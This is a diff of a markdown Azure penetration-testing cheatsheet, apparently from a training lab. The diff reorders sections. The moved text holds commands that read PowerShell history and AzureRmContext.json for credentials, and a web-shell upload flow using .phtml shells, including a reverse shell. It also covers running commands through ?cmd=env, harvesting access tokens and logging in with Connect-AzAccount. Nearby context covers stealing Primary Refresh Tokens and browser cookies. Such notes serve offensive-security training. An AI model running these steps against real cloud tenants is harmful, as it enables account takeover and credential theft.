@@ -99,16 +99,15 @@ Get-AzKeyVault
   - [RunCommand](https://github.com/conma293/Azure/blob/main/cheatsheet.md#runcommand)
   - [Connect to VM](https://github.com/conma293/Azure/blob/main/cheatsheet.md#connect-to-vm)
     - [Get Public IP](https://github.com/conma293/Azure/blob/main/cheatsheet.md#get-public-ip)
-  - [Steal Primary Refresh Token (PRT)](https://github.com/conma293/Azure/blob/main/cheatsheet.md#steal-primary-refresh-token)
-    - [Get nonce]
-    - [Get PRT]
 - Interesting File Locations
   - [Powershell History](https://github.com/conma293/Azure/blob/main/cheatsheet.md#powershell-history---credentials)
   - [AzureRMContext.json]()
   - [Token Stealing]()
 - Web Application Exploitation
   - [Insecure WebApp FILE UPLOAD](https://github.com/conma293/Azure/blob/main/cheatsheet.md#web-application-file-upload)
-
+- [Steal Primary Refresh Token (PRT)](https://github.com/conma293/Azure/blob/main/cheatsheet.md#steal-primary-refresh-token)
+   - [Get nonce]
+   - [Get PRT]
 
 # Tools
 ### AzAD
@@ -507,6 +506,50 @@ $sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOpt
 Enter-PSSession $sess
 ```
 
+
+## Interesting File Locations
+#### Powershell history - credentials
+```
+cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+#### AzureRmContext.json - credentials inc Client Secret for Managed Identity
+```
+cat C:\Users\studentuserx\.Azure\AzureRmContext.json
+```
+
+
+# Web Application File Upload
+
+Files:
+- studentxshell.phtml
+- studentxtoken.phtml
+- RevShell_phtml.phtml
+
+Example upload:
+```
+https://defcorphqcareer.azurewebsites.net/
+https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
+```
+
+append:
+```
+/uploads/studentxshell.phtml?cmd=env
+```
+
+For tokens browse to:
+```
+/uploads/studentxtoken.phtml
+```
+
+Now we can launch an session
+```"client_id":``` ==  ```-AccountId```
+
+```
+Connect-AzAccount -AccessToken $Token -AccountId <client_id>
+```
+
+
 ## Steal Primary Refresh Token
 #### Get nonce
 ```
@@ -549,53 +592,6 @@ Invoke-Command -Session $infradminsrv -ScriptBlock{cat C:\ProgramData\PRT.txt}
 - As the redirect to office.com is spinning and not loading, open up a few new tabs and navigate, it should grab the cookie:
 	- https://endpoint.microsoft.com/#home
 	- portal.azure.com
-
-## Interesting File Locations
-#### Powershell history - credentials
-```
-cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-```
-
-#### AzureRmContext.json - credentials inc Client Secret for Managed Identity
-```
-cat C:\Users\studentuserx\.Azure\AzureRmContext.json
-```
-
-
-
-
-
-# Web Application File Upload
-
-Files:
-- studentxshell.phtml
-- studentxtoken.phtml
-- RevShell_phtml.phtml
-
-Example upload:
-```
-https://defcorphqcareer.azurewebsites.net/
-https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
-```
-
-append:
-```
-/uploads/studentxshell.phtml?cmd=env
-```
-
-For tokens browse to:
-```
-/uploads/studentxtoken.phtml
-```
-
-Now we can launch an session
-```"client_id":``` ==  ```-AccountId```
-
-```
-Connect-AzAccount -AccessToken $Token -AccountId <client_id>
-```
-
-
 
 
 
